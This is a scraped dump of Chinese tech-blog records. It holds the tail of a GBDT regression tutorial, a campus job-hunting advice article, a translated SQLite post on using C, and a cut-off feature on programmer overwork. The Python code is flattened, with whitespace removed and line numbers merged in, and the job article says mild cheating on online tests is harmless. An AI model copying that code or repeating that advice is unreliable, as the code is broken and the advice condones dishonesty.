ip(y,y_hat)]2.5训练模型训练模型的时候需要注意以下几点：1.控制树的最大深度max_depth；2.控制分裂时最少的样本量min_samples_split；3.训练每一棵回归树的时候要乘以一个学习率lr，防止模型过拟合；4.对样本进行抽样的时候要采用有放回的抽样方式。deffit(self,X,y,n_estimators,lr,max_depth,min_samples_split,subsample=None):self.init_val=self._get_init_val(y)n=len(y)y_hat=[self.init_val]*nresiduals=self._get_residuals(y,y_hat)self.trees=[]self.lr=lrfor_inrange(n_estimators):idx=range(n)ifsubsampleisnotNone:k=int(subsample*n)idx=choices(population=idx,k=k)X_sub=[X[i]foriinidx]residuals_sub=[residuals[i]foriinidx]y_hat_sub=[y_hat[i]foriinidx]tree=RegressionTree()tree.fit(X_sub,residuals_sub,max_depth,min_samples_split)self._update_score(tree,X_sub,y_hat_sub,residuals_sub)y_hat=[y_hat_i+lr*res_hat_ifory_hat_i,res_hat_iinzip(y_hat,tree.predict(X))]residuals=self._get_residuals(y,y_hat)self.trees.append(tree)12345678910111213141516171819202122232425262728deffit(self,X,y,n_estimators,lr,max_depth,min_samples_split,subsample=None):self.init_val=self._get_init_val(y)n=len(y)y_hat=[self.init_val]*nresiduals=self._get_residuals(y,y_hat)self.trees=[]self.lr=lrfor_inrange(n_estimators):idx=range(n)ifsubsampleisnotNone:k=int(subsample*n)idx=choices(population=idx,k=k)X_sub=[X[i]foriinidx]residuals_sub=[residuals[i]foriinidx]y_hat_sub=[y_hat[i]foriinidx]tree=RegressionTree()tree.fit(X_sub,residuals_sub,max_depth,min_samples_split)self._update_score(tree,X_sub,y_hat_sub,residuals_sub)y_hat=[y_hat_i+lr*res_hat_ifory_hat_i,res_hat_iinzip(y_hat,tree.predict(X))]residuals=self._get_residuals(y,y_hat)self.trees.append(tree)2.6预测一个样本def_predict(self,Xi):returnself.fn(self.init_val+sum(self.lr*tree._predict(Xi)fortreeinself.trees))12def_predict(self,Xi):returnself.fn(self.init_val+sum(self.lr*tree._predict(Xi)fortreeinself.trees))2.7预测多个样本defpredict(self,X):return[self._predict(Xi)forXiinX]12defpredict(self,X):return[self._predict(Xi)forXiinX]3效果评估3.1main函数使用著名的波士顿房价数据集，按照7:3的比例拆分为训练集和测试集，训练模型，并统计准确度。@run_timedefmain():print(\"TesingtheaccuracyofGBDTregressor...\")X,y=load_boston_house_prices()X_train,X_test,y_train,y_test=train_test_split(X,y,random_state=10)reg=GradientBoostingRegressor()reg.fit(X=X_train,y=y_train,n_estimators=4,lr=0.5,max_depth=2,min_samples_split=2)get_r2(reg,X_test,y_test)1234567891011121314@run_timedefmain():print(\"TesingtheaccuracyofGBDTregressor...\")X,y=load_boston_house_prices()X_train,X_test,y_train,y_test=train_test_split(X,y,random_state=10)reg=GradientBoostingRegressor()reg.fit(X=X_train,y=y_train,n_estimators=4,lr=0.5,max_depth=2,min_samples_split=2)get_r2(reg,X_test,y_test)3.2效果展示最终拟合优度0.851，运行时间2.2秒，效果还算不错~3.3工具函数本人自定义了一些工具函数，可以在github上查看utils.pygithub.com1.run_time–测试函数运行时间2.load_boston_house_prices–加载波士顿房价数据3.train_test_split–拆分训练集、测试集4.get_r2–计算拟合优度总结GBDT回归的原理：平均值加回归树GBDT回归的实现：加加减减for循环【关于作者】李小文：先后从事过数据分析、数据挖掘工作，主要开发语言是Python，现任一家小型互联网公司的算法工程师。Github:https://github.com/tushushu1赞收藏评论关于作者：伯乐在线读者①本账号用于发布那些在伯乐在线无账号的读者的投稿，包括译文和原创文章。②欢迎加入伯乐在线专栏作者：http://blog.jobbole.com/99322/个人主页·我的文章·34", "url_object_id": "b55de04af9ae4faef14ef32e4c533022"},{"title": "程序员找工作面试会遇到哪些坑", "url": "http://blog.jobbole.com/114356/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/4a043f41f5b2e7764b45919c95078c9f.jpg"], "praise_nums": 1, "fav_nums": 0, "comments_nums": 0, "tags": "2,0,1,8,/,0,9,/,0,5, ,·", "content": "原文出处：千古壹号前言我在JD工作已经有四个多月了，加班一直都比较多，不是因为工作量太大，而是因为自己不会的东西太多。电商行业的确是一个很锻炼人的地方。2018年4月份，我写的那篇文章《裸辞两个月，海投一个月，从Android转战Web前端的求职之路》，引起了很多同学的共鸣，甚至有几位同学留言说他们连续看了好几遍。这就让我诞生了一个想法：集中写一些和“职场”有关的文章。先简单介绍一下我的个人履历：我于2013年6月毕业于一个很普通的二本学校，2016年6月毕业于电子科技大学（985院校）。从学校毕业后，我的第一份工作是在一家不大不小的公司写代码。2018年4月，我来到JD工作，继续写代码，但是换了一个方向，几乎是从零开始积累。我经历过普通学校找工作时的无助，也经历过名校找工作时的各种大好机会。我经历过校招，也经历过社招。校招和社招的区别还是很大的，我准备分两篇文章来写。就比如，一个最典型的区别是：校招：公司全国各地跑，去学校招人。社招：求职者全国各地跑，去公司面试。今天这篇文章，我们就来聊一聊校招找工作时会遇到哪些坑。需要注意的是，这些坑不一定是用人单位让我们踩的，也有可能是我们自己给自己挖的坑。而最大的坑就是：我们什么都没做，不闻不问，让机会悄悄溜走。找工作的最佳时间如果你现在在上大学，找工作的最佳时间，应该是大四上学期。也就是说，大三暑假这两个月，你要开始好好规划、好好准备了。如果找到比较满意的工作，可以考虑毕业前去实习。如果你现在在读研（学制一般是三年），找工作的最佳时间，是研三的9月份和10月份。也就是说，研二暑假的这两个月，你一定要多去图书馆，提升自己。当然，有些大公司会很早就开始招实习生，如果你有意向，也要尽早关注和准备。总而言之，校招找工作前，请一定利用好暑假那两个月的黄金时期，做一些功课，提升专业技能。可能会有些同学会利用暑假的时间做家教、学驾照等，具体怎么安排需要你们自己去权衡。我只提醒一点：临近毕业，没有什么是比你们的前程更重要的。错过了，就是一辈子。我猜，应该有一部分同学，临近毕业的时候，还没有找到工作。如果是这种情况，我给不了什么建议，但有一点可以确定的是：请一定利用好在校期间的求职机会。如果等到毕业之后再找工作，将会非常艰难，要求也会非常高，因为那个时候，你走的不再是校招渠道，而是社招渠道，到时候你的竞争对象可是全国人民。选哪个城市找工作前，很多问题要想清楚，不要盲目找。首先要想清楚的是：毕业后你打算去哪个城市发展。就业机会、工资、房价、和妹子异地等等，这些都是需要去权衡的因素。至于何去何从，只有你自己能决定。就拿互联网行业的就业机会来举例，北京的互联网公司数量，占据了全国互联网公司数量的一半以上。看看下面这张图就知道了：要投递什么岗位大学里，有一些专业，毕业后是不太好找工作的，导致很多女生毕业后去做了微商。说到岗位，谈一下我所熟悉的互联网公司。如果你想进互联网公司，不一定要做程序员，其他岗位你可以考虑下，比如：产品、运营、测试等。这些岗位，在学校都是没有对应的专业的。需要的是你做出改变的勇气，并踏出第一步。校招面试有哪些环节一般来说，面试的流程分为：官网投简历、宣讲会、笔试、面试、offer发放。现在，我来逐一阐述。投简历：大公司的校园招聘信息、流程、时间节点，一般都会在公司的官网挂出来。投简历时，我们只需按照上面的提示，进入指定的系统进行操作即可。比如腾讯校园招聘的官网是长这样的：小公司的校园招聘信息，一般会挂在其他的聚合类网站上（比如学校的招聘网站、第三方的招聘网站等）。当然，我建议你，无论公司大小，都要去公司的官网瞧一眼。宣讲会：企业去一个城市招人时，一般会先去学校举办一场宣讲会，给公司做做推广和宣传，说白了就是打广告。就拿四川的成都市来举例，成都市的高校数量，少说也有十几个，企业会在每个学校开宣讲会吗？当然不会。一般会首选电子科大学和四川大学，稍微有点情怀的企业，会再考虑一下西南交通大学。宣讲会一定要参加吗？答案是：如果你有空，就去参加；如果你没空，可以不去。有一点要注意：别错过笔试和面试的时间就好。参加宣讲会，只会让你对那家公司更加蠢蠢欲动，并不会增加你面试成功的概率。因为所有公司的宣讲会都是报喜不报忧，甚至有很多夸大其词的成分。我个人认为，企业在宣讲会上把公司夸得天花乱坠并不是什么好现象。当毕业生工作一段时间后，对所在公司的评价一般都是：“还行吧，就那样”，这个时候再想想自己曾经满怀期待参加过的那场宣讲会，难免会有一些心理落差。笔试：有些公司的笔试会安排在学校的教室里，也有一些公司是在线笔试的形式。稍微大一点的互联网公司，基本都是在线笔试。所谓在线笔试，指的是：你在宿舍里打开电脑，开启电脑的摄像头，在指定的网站上做题目。有同学可能会问，在线笔试肯定很容易作弊吧？答案是肯定的。但是，作为应聘者，最重要的一条考核指标就是诚信第一。就算你以作弊的形式通过了笔试，可如果在面试环节，面试官问你：“你之前参加的笔试题目，给我讲一下你是怎么做出来的？”这很容易就看出你的水平和诚信问题了。所以说，轻微地作弊没有太大影响，但不要太过分就行了。温馨提示一下，笔试这个环节，至少会刷掉一半的人。如果你参加完笔试，发现自己很多题目都不会做，不要犹豫，赶紧准备下一家。心理测试/行测题：在安排笔试or面试之前，很多公司会首先要求你做一套心理测试题或者是行测题。这个环节，一般都不会刷人，如果遇到不会做的题目，网上基本也能找到答案。但有一些公司的心理测试题是具有一票否决权的。也就是说，就算你的笔试和面试的表现再好，可如果心理测试没通过，不好意思，你被刷了。比如华为公司在这一环节进行大量刷人，是出了名的。不少同学参加完华为的心理测试题，自我感觉良好，最后还是莫名其妙被刷。比如深圳的大疆公司，也会在这一环节刷掉一大批人。如果被刷，不要气馁，并不是你心理有问题，只能说，你与该公司的价值观不符，不如另谋高就。面试：面试一般会安排在酒店进行。这个环节应该是最辛苦的，因为你要起得很早，坐公交地铁去市区，一天跑好几趟。你舍不得打车去，因为花了几十块钱赶到面试现场，最后只面了几分钟就完事，这种感觉是很失落的。面试请尽量不要迟到，如果和别的面试冲突了，建议提前联系hr，商量一下，另行约定时间，hr一般都会同意。联系hr时，建议先发短信，如果没有回复，再电话联系。offer发放：如果你拿到了offer，那一定要以offer邮件为准。邮件上至少需要注明：月薪是多少、社保和公积金的缴纳基数和比例是多少。如果你接手offer，就可以开始签三方了。有些公司的hr可能会这样说：“恭喜你通过我们公司的面试，需要你马上过来签合同；否则，机会就留给别人了。”这个时候，你要好好斟酌一下机会成本。最后总结一句：一定不要错过各个面试环节的时间节点。我们要做哪些准备工作针对每一次面试，我们要做到「有备而来」。准备一段自我介绍毫无疑问，每一次面试，面试官问的第一个问题一定是：“你先做一段自我介绍”。假设一家公司有三轮面试，你估计要讲三遍自我介绍。根据我的经验来看，你完全可以提前准备一段自我介绍的模板，以后只要面试官问你该问题，你就这么回答。这是完全ok的。但是，自我介绍的模板一定要认真准备。你需要准备一段适合你自己的、为你自己量身定做的、符合你个人特点的模板，而且要走心。你有什么优势、有什么不足、有什么话你觉得可以让面试官眼前一亮的，都可以放到模板里。把需要投递的公司，在表格上记录下来校招时，我们每天都会不停地往各大网站投简历、填资料，这种操作称之为海投。时间一久，哪些公司你投过简历，根本就不记得。所以，最好是用表格把每个公司记录整理下来，表格里至少要包含如下信息：公司名称公司网址投递的网址、投递账号笔试、面试时间我当前的面试进展把将要面试的公司，做一个todolist如果你今天有两个面试、明天有三个面试，难道面试的时间都要记在脑子里么？当然不是，我建议你列一个todolist（待办事项）。比如，我当初参加校招时，是这样列出来的：校招找工作有哪些渠道各大公司的官网在向一个公司投简历之前，你需要做的第一件事，就是去看该公司的官网。大公司的校招信息，一定会首发在官网上。第三方的招聘网站有些小公司可能没有网站，就算有网站，也是常年不更新。这些公司的招聘信息，一般会发布在第三方的招聘网站上。我所知道的常见网站有以下几个：大街网：www.dajie.com牛客网：www.nowcoder.com。牛客网上发布的招聘信息以互联网公司为主。内推我的上一篇文章，被读者问的最多的一个问题是：我是哪里找来的这么多的内推渠道。答案是：我都是找的校友。内推指的是“内部推荐”。比如说，我在京东上班，你可以直接把简历发给我，我再把你的简历转发给公司的hr。hr看了简历之后，如果满意，就会直接通知你来面试。有些童鞋可能会有疑问：“如果其他同学都走内推渠道了，那对于那些正常走校招渠道人来说，也太不公平了吧？”如果你有这种想法，那就大错特错了。当你去追求公平的时候，就已经输了。实质上，内推是有大大的好处的，我来给你分析下：从应聘者的角度讲，内推流程会快很多，可以省去漫长的校招流程。况且，如果内推没通过，可以继续走校招流程，二者并不冲突。从公司的角度讲，可以省去一大把筛选简历的时间。茫茫人海，简历多如牛毛，如果逐一筛选，实在是没有这个时间和精力，很容易漏掉有才华的人。一般来说，公司员工内推的简历，质量也不会太差。举个例子，小明毕业于电子科技大学，毕业后去BAT上班，小明给公司内推的简历，大部分都是来自电子科技大学的校友。所以说，内推的简历，整体质量都是比较高的。从小明的角度来讲，他如果把别人内推成功了，小明自己也会获得“伯乐奖”。千里马常有，而伯乐不常有。内推，会让hr在人群中多看你一眼。从上面的分析中，可以看出：毕业于一所好的大学，别的优势先不说，但至少会让你拥有重要的资源、环境、人脉。需要提醒你的是，内推渠道一般会比正式的校招渠道要早。如果你觉得自己的能力还不够，就不要去找别人内推凑热闹。有这个时间，还不如好好复习，准备校招面试。是去大公司还是小公司校招，毫无疑问，一定是优先考虑大公司。大公司的优势非常多，这一点，我以后准备专门写一篇文章。人生的第一份工作是很重要的。如果你去了一个毫不起眼的小公司，等你下次跳槽的时候，几乎没啥优势可言，除非你的能力非常强。但如果你的第一份工作是在大公司，以后跳槽的时候，你就是被别人捧在手心的宝贝。当然，我这么说，并不是鼓励大家跳槽，而是让大家明白：让自己升值，很重要。当你处在一家大公司的时候，你就已经升值了。关于“大公司与小公司的区别”，不少在校大学生，听过的最多的一句话是：“在大公司打工，你只是做一颗螺丝钉，发挥不了太大的作用；在小公司工作，你的综合能力会得到很好的锻炼”。在我看来，这句话是完全扯淡的。任何一项庞大的工程，本来就是分工协作的，你可以今天当螺丝钉，明天当螺丝帽，综合能力一样可以得到体现。我不鼓励应届生去小公司，主要是因为：很多小公司都比较坑，会通过各种手段损害、压榨员工的利益（具体内容我就不详细说了）。这种公司只能用三个字来形容：不靠谱。不少学生可能会有这样的期待：“我希望加入一家小公司，与公司一同成长。”如果你有这种想法，说明你还太年轻。据统计，92%的创业公司，活不过三年。你以为，在中关村摆个柜台，十年之后，就可以成为第二个刘强东么？当然了，有些情况，需要特殊考虑。举几个例子：比如说，小公司看中了你的能力，专门以高薪挖你过去，这个时候，你确实可以考虑一下。每一家成功的创业公司，一开始都是靠几个有非凡梦想、非凡能力的人撑起来的。阿里巴巴当初创业的时候，不也是有十八罗汉么？比如说，你拿到了两个offer：一家大公司、一家小公司。大公司是国企，据说在里面待着会比较闲，能力得不到提升。这个时候可以考虑去小公司，或者继续找其他的工作。比如说，你作为一个有梦想的热血青年，想去创业，那当然是应该值得鼓励的。充满期望、蒸蒸日上的小公司有吗？当然有，但比例很少。如果你想冒险一试，我不反对。总结一下：如果你是像大部分人一样，是去给资本家打工的，请优先考虑大公司。用人单位会有哪些坑用人单位的坑是很多的，尤其是在社招的时候，有非常非常多的坑。不过，本文讲的是校招，我就大概列举几条。没有官方网站的公司，要慎重面试一家公司之前，要先了解一下该公司的基本介绍、公司所做的产品和服务、公司的成立时间、公司的人员规模、公司的办公地址等，另外还要了解公司的业绩和发展前景。这是作为求职者最基本的常识。为了清楚以上这些信息，我们首先应该想到的是：去该公司的官网看看。如果这家公司没有官网，那就一定要慎重。其次，我们还要去「国家企业信用信息公示系统」上查一下公司的基本信息，网址是：http://www.gsxt.gov.cn/上面这个网站，打开后的界面如下：通过这个网站，我们可以查到任何一家公司的基本信息：（成立时间、法定代表人等）如果你在上面这个网站上没有找到某公司的信息，放心吧，这个公司一定是个骗子。另外，我们还可以去其他的第三方网站上查某公司的更多信息，在此推荐几个网站给大家，方便大家查询各种公司的各种信息：天眼查：www.tianyancha.com企查查：www.qichacha.com看准网：www.kanzhun.com有些小公司会跟你说：“试用期期间，会安排你去另外一个地方集中培训几个月，你甚至要先交点钱。”这个时候你要注意了，这很有可能是一个传销组织。之前在各大招聘网站上，发生过很多求职者被骗的例子。比如下面这条新闻，可是震惊大江南北的：有些公司只是来做宣传的有些公司，你从来就没听说过他的名字，或者说，你从来没有听说过该公司的产品。但是在宣讲会上，这些公司却把自己夸的天花乱坠。放心吧，这些公司基本不是来招人的，而是来做宣传的。你参加了这个公司的笔试题，然后就不会有下文了。但是应聘者的时间是很宝贵的，参加了这个公司的笔试，也许就错过了另外一家公司的机会。所以说，你自己要好好权衡。毕业前签约，毕业后毁约有些公司是挺搞笑的，你毕业前，公司和你签约了；等你毕业后，公司马上和你毁约，甩掉你。大公司一般不会这么做，有损公司名誉，就算这么做，好歹也是等你工作几个月再裁掉你（比如酷派公司在2017年就对应届生这么干过）。给大家举一个真实的例子：我当初在读大四的时候，有一家本地的刚成立的小公司来我们学院疯狂招人，光是我们班，就招了近10个过去。辅导员甚至鼓励学生们去那家公司。辅导员当时乐开了花，恨不得那些没找到工作的学生，都去跟这个公司签合同。为什么这么说呢？如果大家都有工作了，那学生的就业率就是100%，辅导员的业绩和指标就上去了。我非常清楚的记得，合同签完之后，那家公司的老板请辅导员和学生们大吃大喝了一顿。最后的结果是什么样子呢？毕业之后，那家公司把招到的学生全部辞退了，因为公司的工厂都还没建好，又怎么可能还招人干活呢？那些学生怎么办呢？只能各回各家，各找各妈。学校和辅导员只关心学生们在校期间的就业率，等你一毕业，就跟学校没有关系了。所以说，我的建议是：一些小公司，尤其是那种刚成立不久的公司，应届生一定要慎重。就怕你到时候不仅没工作，而且也错过了找其他工作的时机，上哪儿哭去？社保和公积金社保和公积金这部分，也是个大坑。你一定要了解清楚。社保一般由五个部分组成：养老、医疗、失业、工伤、生育。应届生们一般只关心的问题是“公司会不会交社保和公积金”。但这远远不够，你更应该关心的是“交的基数和比例”。给大家举个我自己的例子：我毕业之后，第一份工作是在H公司（公司的名字先这么叫着），给我的月薪是1W（这不是我的真实工资，我只是为了方便给大家打比方，但缴纳的比例是真实的）。这1W的月薪，是这么组成的：基本工资5000元（这同样也是我缴纳社保、公积金的基数）绩效工资4000元（绩效工资每个月都会给满）房补1000元当时拿到offer的时候，公司说从试用期开始就会给我交社保，于是我也就安心了。当我拿到第一个月的工资时，我才发现H公司是多么的抠门：医保每月共缴纳40元。包括：公司缴纳5000*0.6%=30元，个人缴纳5000*0.2%=10元。而且缴纳的是深圳市二档医保。普通门诊是无法报销的。公积金每月共缴纳500元。包括：公司缴纳5000*5%=250元，个人缴纳5000*5%=250元。等我来到了JD公司工作，公司每月给我缴纳的医保和公积金情况是这样的：（同理，这个基数不是我真实的工资和基数，我只是为了方便给大家打比方，但缴纳的比例是真实的）医保每月共缴纳2100元。包括：公司缴纳10000*13%=1300元，个人缴纳10000*8%=800元。而且缴纳的是深圳市一档医保，普通门诊可以报销。公积金每月共缴纳2400元。包括：公司缴纳10000*12%=1200元，个人缴纳10000*12%=1200元。把H公司和JD公司对比一下，你会发现：H公司缴纳的基数和比例很少。每个员工少缴纳几千，再乘以员工总人数，这样算下来，H公司能省一大笔钱。我想，我已经讲得够清楚了吧？关于培训机构前几年，互联网行业如井喷式发展，连猪都能飞起来，互联网行业的工作也随之热门起来。大家听说互联网的工资高，于是纷纷涌进来。工资高是真的，但加班疯狂也是真的。我知道，很多非计算机专业的学生，为了学编程写代码，会花半年的时间，交几万块钱，去参加线下的培训班。如果你现在还有这种想法和行为，我的建议是：请三思、请慎重。首先，程序员这个岗位的学习成本和难度并不低，你要考虑一下写代码是否真的适合自己。很多时候，你觉得自己对某个东西感兴趣，是因为不了解。其次，你参加了培训班之后，再去找工作，我猜你在简历上保证不敢说自己参加过培训班。因为，现在很多公司招人，对培训班出来的学生是比较抵触的，这些学生只是为了速成，计算机基础的底子太差。不少培训机构说：“只要你来参加我的培训班，我保证给你推荐就业”。这句承诺基本是骗人的。会不会给你推荐就业我不知道，但培训机构的老师教你简历造假，是常有的事。再次，如果你真的一点基础都没有，直接去参加线下的培训班，节奏肯定是肯快的，你估计适应不了。还不如买一些线上的视频来自学，自己在家里看，想暂停就暂停，还可以倍速播放。我看慕课网上的IT视频，质量都挺高（慕课网的同学看到后请自觉赞赏）。当然了，看线上视频自学，你得有很好的自制力才行。最后，如今的经济形势不太好，很多互联网公司都抱团取暖，互联网的岗位显然是僧多粥少。而最大的问题在于：很多程序员只是处于入门的水平，真正有水平的程序员太少了。关于考研不要一边考研一边找工作。如果同时做两手准备，很有可能最后两边都没有收获。是否考研，你在大三的时候就应该考虑清楚。如果你打算考研，就请专心考研，不要给自己留退路。那到底有没有必要考研，这个话题有点长，以后专门写一篇吧。一些其他的疑问面试要不要穿正装？要不要穿正装，取决于你面试的是什么岗位。如果你面的是销售岗位，那毫无疑问，无论刮风下雨，无论烈日炎炎，都要穿西装打领带。不过你放心吧，校招面试的地方一般都是在酒店等有空调的地方，不会太热。如果你面试的是屌丝程序员岗位，着装是没有特别的要求的，不要太随意即可。穿个大头鞋去面试是肯定不允许的。当然了，短袖衬衫肯定是要比短袖T恤要更有精气神儿。这个你们就自己决定吧。如果你面试的是其他岗位，是否要穿正装，你最好是提前问清楚（问学长学姐、问其他面试的人等）。该如何谈薪资校招的薪资一般都是白菜价（统一价），这个没什么好谈的。除非你能力非凡，拿到specialoffer，那当然可以跟hr谈一谈。成绩单的原件一定要放在自己手里留着有些公司面试，会看你的成绩单。有些同学在校期间是学霸，会主动把成绩单放在简历下方递给面试官。我需要提醒你的是：把成绩单的复印件给别人就好，请你自己妥善保管好原件。简历可能要投很多次，但一定要有耐心一般来说，投递十家公司，如果能有一家公司给你回应，那就算很不错的了。所以，你一定不要气馁，多投一点，没关系。而且，在投递的过程中，请不断完善简历。我自己的校招经历我可以比较自豪的说，我是毕业于985院校的研究生。我也可以很自豪的说，在我研三找工作的时候，你能想到的任何一家有名气的互联网公司，都会来我们学校做招聘。但经过一个多月的海投，我最终只拿到了两家公司的offer：中兴公司和H公司。很遗憾，那些你能想到名字的互联网公司，我都投过简历，但都挂了，无一幸免。眼看着我们班的其他同学手里的offer，覆盖了每一家大型互联网公司，我这心里真不是滋味。我的室友是班上公认的学霸（我在读研期间，宿舍是二人间），专业能力也非常强，很多同学平时遇到上问题都是向他请教。可惜，他到了十月份的时候，手里一个offer都没有，最后去了老家那边的国家电网，做一个小镇的无名码农。关于校招的内容，我就写到这里。针对校招，如果你有好的建议、你踩过了哪些坑、你有推荐的资源或网站，欢迎在文本的下方留言。想看看我对社招的看法吗？且听下文分解。最后一段有人说，找工作全靠运气。但我认为：在运气来临之前，越努力，越幸运。1赞收藏评论", "url_object_id": "4d8d8d269b4a01449e795cdb98474804"},{"title": "受 SQLite 多年青睐，C 语言到底好在哪儿？", "url": "http://blog.jobbole.com/114331/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/06/45d153deb05afc91d5c64e84b323bce2.png"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,8,/,3,1, ,·", "content": "原文出处：SQLite译文出处：开源中国社区SQLite近日发表了一篇博文，解释了为什么多年来SQLite一直坚持用C语言来实现，以下是正文内容：C语言是最佳选择从2000年5月29日发布至今，SQLite一直都是用C语言实现。C一直是实现像SQLite这类软件库的最佳语言。目前，还没有任何计划要采用另外一门语言对SQLite进行重新开发。为什么C语言是实现SQLite的最佳选择？原因主要体现在这几个方面：性能兼容性低依赖性稳定性1、性能像SQLite这类库要求速度必须要快。SQLite的速度就很快，它比文件系统快35%（详情可以参考这两个示例：InternalVersusExternalBLOBs和35%FasterThanTheFilesystem）。而C语言就能实现快速编写代码。C语言通常被描述为“可移植性的汇编语言”。它使开发人员能够尽可能靠近底层硬件进行编码，同时仍然可以跨平台保持可移植性。平常，我们可能会看到有人描述某种语言“像C语言一样快”，却不会看到有人说，作为通用目的编程时，会有一门语言“比C语言快”，因为这种语言真的不存在。2、兼容性几乎所有系统都能调用C语言编写的库，但其他语言就不尽然。例如，用Java编写的Android应用能够调用SQLite（通过适配器）。如果用Java编写SQLite，那么对Android来说可能会更方便，因为这会使接口更简单。但在iPhone上，应用程序是用Objective-C或Swift编写的，它们都不能调用用Java编写的库。因此，如果用Java编写，SQLite将无法在iPhone上使用。3、低依赖性用C语言编写的库对运行时没有很强的依赖。SQLite的最低配置也只要求C库中的这些方法：memcmp()memcpy()memmove()memset()strcmp()strlen()strncmp()在更完整的构建中，SQLite也使用诸如malloc()和free()之类的库例程以及用于打开，读取，写入和关闭文件的操作系统接口。但即便如此，依赖的数量也很少。4、稳定性C语言易于理解，契合了SQLite的要求，适合SQLite的开发。为什么SQLite不使用面向对象的语言？开发人员可能无法想象用“非面向对象”来开发一个像SQLite这样复杂的系统会是什么样子。所以SQLite为什么不使用C++或者Java来开发呢？1、用C++或Java编写的库通常只能由以相同语言编写的应用程序使用。使用Haskell或Java编写的应用程序很难调用用C++编写的库。另一方面，用C语言编写的库可以从任何编程语言调用。2、面向对象是设计模式，而不是编程语言。你可以使用任何所需语言（包括汇编语言）进行面向对象编程。某些语言（例如：C++或Java）可以使面向对象更容易，但你仍然可以用像C这样的语言进行面向对象的编程。3、面向对象不是唯一有效的设计模式。对象通常是分解问题的好方法。但不是唯一的方法，也不总是分解问题的最佳方法。有时好的旧程序代码更容易编写，更易于维护和理解，并且比面向对象的代码更快。4、SQLite进行开发时，Java还不是一门成熟的语言，C++会成熟一点，但当时要找到两种能以相同方式工作的C++编译器比较困难。相比之下，C语言是个不错的选择。虽然，这种情况现在有所改善，但为此对SQLite重新开发并没有什么好处。为什么SQLite不使用”安全”语言编写？使用“安全”语言不易发生内存泄露、数组溢出等的安全问题。最近，许多人好像对Rust和Go这样的“安全”语言感兴趣。但SQLite为什么不使用呢？1、SQLite出现后的10年时间里，所谓的“安全”语言还不存在。虽然SQLite可以用Rust或者Go重新编写，但这样可能会引入更多难以修复的Bug，进而会影响编码速度。2、“安全”编程语言解决简单的问题：像内存泄露、数组溢出等。在解决SQL计算结果这类的问题上，并不如C语言好用。3、“安全”语言可防止安全漏洞，但SQLite并非一个对安全敏感的库。如果应用运行了不受信任的SQL，那它可能已经存在更大的安全问题，而这是“安全”语言无法修复的问题。4、一些“安全”语言（如Go语言）不喜欢使用assert()，但这是保持SQLite可维护性的重要前提。5、“安全”语言会插入额外的机器分支来执行其他操作。但在正确的代码中，这些分支并不会被采用。所以机器代码不能100%被测试到，可这恰恰是SQLite质量检测的重要组成部分。6、“安全”语言会在内存不足（OOM）时请求终止，而SQLite的设计是遇到OOM时能重新恢复。目前，还不知道如何利用“安全”语言实现这一点。7、现有的“安全”语言都比较新，SQLite开发员对它们的出现表示赞赏，但依然认为C语言更适合目前的开发工作。文章最后表示，SQLite可能会考虑使用Rust重新开发，但不太可能使用Go语言，因为它对assert()不友好。但其实Rust目前的条件并不足以对SQLite进行重新开发，它还需要继续发展，详情请查看原文。1赞1收藏评论", "url_object_id": "5a1ec5b54e970b6455f9429af8a54930"},{"title": "走近北京后厂村程序员的真实生活：“拿命换钱”", "url": "http://blog.jobbole.com/114364/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/a3f700ca2ede780d76b0ad474852fa91.jpg"], "praise_nums": 1, "fav_nums": 0, "comments_nums": 0, "tags": "2,0,1,8,/,0,9,/,0,9, ,·", "content": "原文出处：中新经纬/赵佳然北京的西北角是个特别的区域，这里汇集了众多互联网及IT企业，实力雄厚的上市公司将自家logo悬挂在大厦的顶端，而刚起步的创业公司也会选择在这里租下一亩三分地。中关村、上地、西二旗、后厂村……它们成为了一个个地标，而在这里工作的年轻人，总是第一时间被打上“码农”“程序员”的标签。在大家眼中，他们往往身着格子衬衫，头戴耳机身背双肩包，披星戴月地上下班，每天十几个小时面对着电脑屏幕。西二旗地铁站我们习惯把他们看作一个整体，从性格、着装到消费水平都大致定型。然而，他们也许曾在某个地铁站多次擦肩而过，但每个人心中的目标、理想和焦虑，都各不相同。我把家从三环里搬到了六环外老田今年28岁，北京生北京长，是个标准的“土著”。10年前的他大概没有想过，自己会来到当时名不见经传的后厂村工作。2013年夏天，老田本科毕业，专业是当年正吃香的计算机与科学技术。他顺利地找到了一份某大型电信公司的内勤工作，但入职后发现，工作的内容与所学的专业知识并无相关。“就是天天处理人际关系，没别的。”他回忆道。不是没有考虑过换行，老田曾经要求过调岗，但却在面试的时候受了挫。“对方本来要问我一个专业问题，后来突然看了看我简历说：‘你是13年毕业的啊，那这个你可能没学过。’后来我就没怎么想着调岗的事了，想看看其他机会吧。”不过这份工作也有极大的优势：工作量少，离家近。老田每天可以8点起床，溜达15分钟到单位，下午5点半之前到家，琢磨晚上给爱人做点什么吃。老田最大的爱好就是做饭，人生理想是拥有属于自己的饭馆，不过这个目标现在看来还远得很。今年年初，也是老田结婚的第二年，他们摇号中了一套共有产权房，这意味着两人从无贷一身轻的状态，变成了每个月需还款7000多元。这突然的改变，也让他不得不再次审视自己的收入情况。“必须要多攒点钱了。”他对自己说。清晨的后厂村路，老田每天的必经之地受访者供图经过熟人介绍，他来到了“大名鼎鼎”的后厂村，在一家央企做工程师。还没开始体会到工作的高强度，通勤的问题就先来了：家住在东三环内，公司在北五环外，高峰期堵得严严实实，咋办？与爱人商量之后，老田决定工作日住到六环外的亲戚家。“往北走高速，开20多分钟就到了，回家直接睡觉。”就这样，从公司到住处，从工作到睡觉的循环开始了。由于已经4年没上手专业技能，突如其来的高强工作量让他发懵。他坦言，工作以来，这是头回一想到上班就开始焦虑。三个月过去，好不容易熟悉了基本操作，但工作压力依然压得他喘不过气。喝不惯咖啡的他，每天中午和其他同事一样，需要在躺椅上休息近一小时，否则整个下午都会浑浑噩噩。一日下班后，老田随手抓了抓脑袋，却惊讶地发现掉了满桌的头发。“我觉得这份工作就是在拿命换钱。”他说。老田办公室的躺椅，同事们几乎人手一个受访者供图其实，老田从来没放弃过开饭馆的梦。他自己也明白，目前的积蓄还无法支撑起这个目标，同时后厂村的高强度作业也不是长久之计。“先干两年，等把知识学到手，也算是留了个后路，以后就算创业失败了，也能养家糊口。”眼看“奔三”了，下一代的计划也渐渐提上日程，他便愈发不敢放松对自己的要求。晚上9点，老